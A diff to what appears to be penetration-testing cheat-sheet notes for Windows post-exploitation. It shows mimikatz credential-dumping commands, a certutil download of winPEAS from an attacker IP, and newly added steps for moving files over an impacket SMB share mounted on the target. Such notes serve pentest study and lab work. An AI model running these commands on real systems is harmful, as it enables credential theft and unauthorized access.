@@ -79,7 +79,15 @@ token::elevate
 lsadump::sam
 ```
 
-### wget equivalant
+### wget equivalant / file transfer
 ```
 certutil.exe -f -urlcache -split http://192.168.49.157/winPEASany.exe
+
+SMB method: 
+On kali:
+impacket-smbserver [SHARE NAME] $(pwd) -smb2support -user [USER ON KALI] -password [PASSWORD ON KALI]
+On windows:
+$pass = convertto-securestring '[PASSWORD ON KALI]' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('[USER ON KALI]', $pass)
+New-PSDrive -NAME [USER] -PSProvider FileSystem -Credential $cred -Root \\[KALI IP]\[SHARE NAME]
 ```
